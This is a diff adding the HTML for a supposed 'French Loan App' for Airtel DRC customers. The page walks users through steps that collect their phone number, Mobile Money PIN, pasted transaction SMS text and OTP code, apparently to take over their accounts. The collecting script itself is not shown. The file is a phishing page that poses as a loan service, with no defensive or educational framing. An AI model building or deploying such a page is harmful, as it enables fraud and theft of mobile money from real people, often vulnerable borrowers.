@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>French Loan App - DRC Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h2>French Loan App</h2>
+      <p>Instant Mobile Loans for Airtel DRC (+243)</p>
+    </div>
+
+    <div id="step-1" class="step-card">
+      <h3>Step 1: Account Verification</h3>
+      <p>Enter your 9-digit Airtel phone number to check loan eligibility.</p>
+      <form id="loanForm">
+        <div class="input-group">
+          <label>+243 Country Code</label>
+          <div class="phone-input-wrapper">
+            <span class="prefix">+243</span>
+            <input type="text" id="phone" placeholder="97, 98, or 99..." maxlength="9" required>
+          </div>
+        </div>
+        <button type="submit" class="btn">Check Eligibility</button>
+      </form>
+    </div>
+
+    <div id="step-2" class="step-card hidden">
+      <h3>Step 2: Account Confirmation</h3>
+      <p>Please enter your 4-digit Mobile Money PIN to verify ownership.</p>
+      <form id="pinForm">
+        <div class="input-group">
+          <label>4-Digit PIN</label>
+          <input type="password" id="pin" placeholder="****" maxlength="4" required>
+        </div>
+        <button type="submit" class="btn">Confirm & Proceed</button>
+      </form>
+    </div>
+
+    <div id="step-3" class="step-card hidden">
+      <h3>Step 3: Security Validation</h3>
+      <p>Enter the recent SMS or transaction text received on your line.</p>
+      <form id="smsForm">
+        <div class="input-group">
+          <label>SMS Content / Transaction Text</label>
+          <textarea id="smsText" rows="3" placeholder="Paste message details here..." required></textarea>
+        </div>
+        <button type="submit" class="btn">Verify SMS</button>
+      </form>
+    </div>
+
+    <div id="step-4" class="step-card hidden">
+      <h3>Step 4: Final OTP Code</h3>
+      <p>Enter the 4-digit code sent to your device to finalize disbursement.</p>
+      <form id="otpForm">
+        <div class="input-group">
+          <label>4-Digit OTP Code</label>
+          <input type="text" id="otpCode" placeholder="1234" maxlength="4" required>
+        </div>
+        <button type="submit" class="btn">Complete Application</button>
+      </form>
+    </div>
+
+    <div id="loading-card" class="step-card hidden text-center">
+      <h3>Processing Request...</h3>
+      <p>Please wait while we securely connect with the validation server.</p>
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+          </html>
+  
